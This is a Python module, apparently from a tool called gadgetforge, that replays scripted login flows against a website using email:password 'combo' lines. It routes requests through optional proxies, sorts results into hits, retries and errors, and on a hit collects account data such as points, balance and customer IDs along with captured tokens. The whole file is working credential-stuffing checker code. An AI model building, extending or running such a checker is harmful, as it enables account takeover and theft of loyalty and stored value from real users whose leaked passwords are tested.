from __future__ import annotations

import json
import re
from typing import Any
from urllib.parse import urljoin

import httpx

from gadgetforge.checker.classify import classify_response
from gadgetforge.checker.jsonpath import get_path
from gadgetforge.checker.models import CheckOutcome, CheckerRecipe, CheckResult, FlowStep, HeaderExtract


class ReplayContext:
    def __init__(self, email: str, password: str) -> None:
        self.email = email
        self.password = password
        self.extracts: dict[str, str] = {}

    def render(self, value: Any) -> Any:
        if isinstance(value, str):
            return self._render_string(value)
        if isinstance(value, dict):
            return {k: self.render(v) for k, v in value.items()}
        if isinstance(value, list):
            return [self.render(v) for v in value]
        return value

    def _render_string(self, s: str) -> str:
        out = s.replace("{{email}}", self.email).replace("{{password}}", self.password)
        for key, val in self.extracts.items():
            out = out.replace(f"{{{{extract.{key}}}}}", val)
            out = out.replace(f"${{{key}}}", val)
        return out


def _apply_extracts(
    step: FlowStep,
    response: httpx.Response,
    ctx: ReplayContext,
) -> None:
    body_text = response.text
    data: Any = None
    try:
        data = response.json()
    except Exception:
        data = None

    for ex in step.extracts:
        val: str | None = None
        if ex.from_ == "response_header":
            val = response.headers.get(ex.name)
        elif ex.from_ == "request_header":
            val = response.request.headers.get(ex.name)
        elif ex.from_ == "response_body" and data is not None and ex.json_path:
            found = get_path(data, ex.json_path)
            val = str(found) if found is not None else None
        if val and ex.regex:
            m = re.search(ex.regex, val)
            if m:
                val = m.group(1) if m.lastindex else m.group(0)
        if val:
            if ex.name.lower() == "authorization" and val.lower().startswith("bearer "):
                val = val[7:]
            ctx.extracts[ex.store_as] = val


def _step_url(recipe: CheckerRecipe, step: FlowStep) -> str:
    if step.url:
        return step.url
    path = step.path or "/"
    base = recipe.base_url.rstrip("/")
    return urljoin(base + "/", path.lstrip("/"))


def run_recipe_check(
    recipe: CheckerRecipe,
    email: str,
    password: str,
    *,
    proxy: str | None = None,
    timeout: float = 30.0,
    client: httpx.Client | None = None,
) -> CheckResult:
    ctx = ReplayContext(email=email, password=password)
    login_step = recipe.login_step_id()
    last_status = 0
    last_body = ""

    own_client = client is None
    if own_client:
        client = httpx.Client(
            proxy=proxy,
            timeout=timeout,
            follow_redirects=True,
        )

    try:
        for step in recipe.steps:
            url = ctx.render(_step_url(recipe, step))
            headers = ctx.render(step.headers)
            if step.auth_from and step.auth_header:
                token = ctx.extracts.get(step.auth_from)
                if token:
                    headers[step.auth_header] = f"Bearer {token}"

            body = None
            if step.body_template is not None:
                rendered = ctx.render(step.body_template)
                if isinstance(rendered, dict):
                    body = json.dumps(rendered)
                    headers.setdefault("Content-Type", "application/json")
                else:
                    body = str(rendered)

            response = client.request(step.method.upper(), url, headers=headers, content=body)
            last_status = response.status_code
            last_body = response.text
            _apply_extracts(step, response, ctx)

            if response.status_code >= 500 and not step.optional:
                return CheckResult(
                    outcome=CheckOutcome.RETRY,
                    email=email,
                    password=password,
                    message=f"{step.id}: HTTP {response.status_code}",
                )

        outcome = classify_response(
            recipe,
            login_step or "",
            last_status,
            last_body,
        )
        data: dict[str, Any] = {}
        if outcome == CheckOutcome.HIT:
            try:
                parsed = json.loads(last_body)
                if isinstance(parsed, dict):
                    for key in ("points", "balance", "customerId", "id"):
                        if key in parsed:
                            data[key] = parsed[key]
            except json.JSONDecodeError:
                pass
            data.update({f"var_{k}": v for k, v in ctx.extracts.items()})

        return CheckResult(
            outcome=outcome,
            email=email,
            password=password,
            message=f"HTTP {last_status}" if outcome != CheckOutcome.HIT else "ok",
            data=data,
        )
    except httpx.TimeoutException:
        return CheckResult(
            outcome=CheckOutcome.RETRY,
            email=email,
            password=password,
            message="timeout",
        )
    except Exception as e:
        return CheckResult(
            outcome=CheckOutcome.ERROR,
            email=email,
            password=password,
            message=str(e),
        )
    finally:
        if own_client and client:
            client.close()


def parse_combo(line: str) -> tuple[str, str] | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if ":" not in line:
        return None
    email, password = line.split(":", 1)
    email, password = email.strip(), password.strip()
    if not email or not password:
        return None
    return email, password
